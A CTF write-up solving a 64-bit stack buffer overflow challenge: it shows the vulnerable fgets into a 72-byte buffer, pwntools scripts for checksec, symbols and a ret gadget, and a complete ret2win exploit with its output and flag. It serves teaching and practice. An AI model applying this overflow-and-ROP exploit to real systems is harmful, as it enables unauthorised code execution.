# Return Of Stack 

## Flag
```
citadel{4lw4y5_b0rr0w_&_r3turn}
```

 bin ex chall.

 `nc chall_citadel.cryptonitemit.in 56743`

## Analysis

### Vulnerability Discovery
Looking at the decompiled code, fgets in the `vuln()` function. i can exploit this

```c
void vuln(void)
{
  char acStack_48 [72];   // 72 bytes
  
  puts("hahaha vro is cooked.");
  fgets(acStack_48,200,stdin);  // reads  200 bytes
  return;
}
```


- `acStack_48[72]` allocates a 72byte buffer on the stack
- `fgets(acStack_48, 200, stdin)` reads  200 bytes into this 72-byte buffer

i tried overflowing the buffer

### Win Function


```c
void win(void)
{
  system("cat flag.txt");
  puts("you got the solve!");
  return;
}
```

fn to  read and display the flag when called.

### more forensics 

in a previous ctf i used this usefull script to extract more info from a binary. ik u can do file on it asw but this is a convenient cheat sheet for me.

```
#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux')

# Load the binary
import os
script_dir = os.path.dirname(os.path.abspath(__file__))
binary_path = os.path.join(script_dir, 'chal')
elf = ELF(binary_path)



print(f"Architecture: {elf.arch}")
print(f"Bits: {elf.bits}")
print(f"Endianness: {elf.endian}")
print(f"PIE enabled: {elf.pie}")
print(f"NX enabled: {elf.nx}")
print(f"Canary: {elf.canary}")
print()

```


    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Architecture: amd64
    Bits: 64
    Endianness: little
    PIE enabled: False
    NX enabled: True
    Canary: False

No stack canary - Buffer overflow is straightforwad

No PIE - Addresses are fixed

Not stripped- We can easily find function addresses

since there is not PIE involved and thus addresses are constant. muffin checked gdb and confirmed asw. i added these 

```

# some address we might need ig
if 'win' in elf.symbols:
    win_addr = elf.symbols['win']
    print(f"win() address: {hex(win_addr)}")
else:
    print("win() not found in symbols")

if 'vuln' in elf.symbols:
    vuln_addr = elf.symbols['vuln']
    print(f"vuln() address: {hex(vuln_addr)}")
else:
    print("vuln() not found in symbols")

if 'main' in elf.symbols:
    main_addr = elf.symbols['main']
    print(f"main() address: {hex(main_addr)}")
else:
    print("main() not found in symbols")

```


    win() address: 0x4011a0
    vuln() address: 0x4011d0
    main() address: 0x401070


To the script and obtained some addresses for the exploit

### Finding Addresses
Using pwntools to analyze the binary:

```
#!/usr/bin/env python3

from pwn import *
import os

context.update(arch='amd64', os='linux')

# Load  binary
script_dir = os.path.dirname(os.path.abspath(__file__))
binary_path = os.path.join(script_dir, 'chal')
elf = ELF(binary_path)


# Create ROP 
rop = ROP(elf)

# Find ret gadgets

ret_gadgets = rop.find_gadget(['ret'])
print(f"ret gadget: {hex(ret_gadgets.address) if ret_gadgets else 'Not found'}")


```
```python

C:\Citadel_CTF_Writeups\Return_Of_Stack>python find_gadgets.py
[*] 'C:\\Citadel_CTF_Writeups\\Return_Of_Stack\\chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] Loaded 6 cached gadgets for 'C:\\Citadel_CTF_Writeups\\Return_Of_Stack\\chal'
ret gadget: 0x40101a

```

Maint thing is this :

```
ret gadget: 0x40101a
```

## Exploitation


### Payload Construction

 - Fill the 72-byte buffer completely
 - Add a `ret` gadget for x64 stack alignment (required for some system calls) -
### why? 
On x64 systems, some functions (particularly those calling system functions) require the stack to be 16-byte aligned. Adding a `ret` gadget before calling `win()` ensures proper alignment.


Add the address of `win()` function

```python
offset = 72
payload = b'A' * offset       # Fill the buffer
payload += p64(0x40101a)      # ret gadget 
payload += p64(0x4011a0)      # win() address
```



### The Exploit

```
#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux')


HOST = 'chall_citadel.cryptonitemit.in'
PORT = 56743


win_addr = 0x4011a0   
ret_gadget = 0x40101a  



print(f"win() address: {hex(win_addr)}")
print(f"ret gadget: {hex(ret_gadget)}")
print()

# Connect to remote server
print("connect ti host")
io = remote(HOST, PORT)

# Receive the banner
io.recvuntil(b'cooked.')


# Buffer is 0x48
# Add ret gadget for x64 stack alignment
#  Add win() address 
offset = 72
payload = b'A' * offset
payload += p64(ret_gadget)
payload += p64(win_addr)

print(f"sending offset: {offset}, length: {len(payload)})")
io.sendline(payload)

print("server output : ")
response = io.recvall(timeout=2)

print(response)

print()
print(response.decode('latin-1', errors='ignore'))

io.close()
print("closed and if it reached here itll work i think")

```
terminal out : 
```python
C:\Citadel_CTF_Writeups\Return_Of_Stack>python exploit_final.py
win() address: 0x4011a0
ret gadget: 0x40101a

connect ti host
[x] Opening connection to chall_citadel.cryptonitemit.in on port 56743
[x] Opening connection to chall_citadel.cryptonitemit.in on port 56743: Trying 74.225.246.247
[+] Opening connection to chall_citadel.cryptonitemit.in on port 56743: Done
sending offset: 72, length: 88)
server output :
[x] Receiving all data
[x] Receiving all data: 1B
[x] Receiving all data: 33B
[x] Receiving all data: 52B
[+] Receiving all data: Done (52B)
[*] Closed connection to chall_citadel.cryptonitemit.in port 56743
b'\ncitadel{4lw4y5_b0rr0w_&_r3turn}\nyou got the solve!\n'


citadel{4lw4y5_b0rr0w_&_r3turn}
you got the solve!

closed and if it reached here itll work i think
```

## Flag
```
citadel{4lw4y5_b0rr0w_&_r3turn}
```
